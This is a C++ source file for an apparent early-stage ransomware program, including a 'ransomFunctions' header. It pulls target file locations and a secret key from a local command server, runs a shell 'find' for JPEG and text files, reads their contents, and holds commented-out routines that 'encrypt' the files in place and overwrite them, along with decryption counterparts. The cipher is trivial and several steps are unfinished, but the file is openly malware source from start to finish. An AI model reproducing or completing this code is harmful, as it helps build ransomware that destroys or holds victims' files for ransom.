#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "headers/ransomFunctions.h" //TODO - leave declarations in here.

#include "headers/json.hpp"



int main(){  
	std::vector<std::string> fileLocationsVector;
	std::vector<std::vector<std::string>> fileContentVector;
	nlohmann::json j_complete = nlohmann::json::parse(get_request("http://127.0.0.1:5000/locations"));
	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");	
    std::vector<std::string> locationsToBeEncrypted;
    int count = 0;

    // TODO - recursively map directories and find in not just local directories and sub directories.
	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.    

	//Reads the locations from the local fileLocation file into a string vector. Then reads contents into its own vector of string vectors.
	bool success = getFileContents("fileLocations", fileLocationsVector);
	
	std::vector<std::string> serverLocationsVector;	
	for(int i = 0; i < j_complete["locations"].size(); i++){
		serverLocationsVector.push_back(j_complete["locations"][i]["location"]);
	}
	
	// TODO - Move to Function. Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
	for(int i = 0; i < fileLocationsVector.size(); i++){		
    	for(int j = 0; j < serverLocationsVector.size(); j++){
    		if(fileLocationsVector[i] == serverLocationsVector[j]){
				count = count + 1;
    			break;   			
    		}        		
    	}
    	if(count == 0){
    		locationsToBeEncrypted.push_back(fileLocationsVector[i]);
    	}
    	count = 0;    	
    }
   	

    //Reads content of each location and pushes it into a string vector which gets pushed into a vector<string::vector>.
	if(success){ 		
		for(std::string& location : locationsToBeEncrypted){
			//post_request(location); //TODO - Fix Post Request!
			std::vector<std::string> temporaryVector;
			if(getFileContents(location, temporaryVector)){	   // Read contents of location.
				fileContentVector.push_back(temporaryVector);  // Pushes each line into a string vector.
				temporaryVector.clear();		
			}			
		}
    }  


 /*   if(locationsToBeEncrypted.size() > 0 ){
	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
		for(auto& file: fileContentVector){
			for(auto& line : file){
				basicEncryptContent(line);
			}
			
		}
		

		// UPDATE FILES - after the contents of the files have been encrypted. Replace contents of file with encrypted content.
		// TODO - Move to function
		std::ofstream myFile;
		for(int i = 0; i < fileContentVector.size(); i++){  //loop through vector<vectors>(3)
			myFile.open(fileLocationsVector[i]);
			for(int j = 0; j < fileContentVector[i].size(); j++){ //loop through contents of files line by line.
				myFile << fileContentVector[i][j] << '\n';
				
			}
			myFile.close();			
		}	
    }*/

 


    // --

 


	/*	// DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
	for(vector<std::string>& file: fileContentVector){
		for(string& line : file){
			basicDecryptContent(line);
		}
	}*/    
	

	/*	// UPDATE FILES - after the contents of the files have been decrypted. Replace contents of file with encrypted content.
	// Move to function
	ofstream myFile;
	for(int i = 0; i < fileContentVector.size(); i++){  //loop through vector<vectors>(3)
		myFile.open(fileLocationsVector[i]);
		for(int j = 0; j < fileContentVector[i].size(); j++){ //loop through contents of files line by line.
			myFile << fileContentVector[i][j] << '\n';
			
		}
		myFile.close();			
	}*/	

	
    return 0;
}
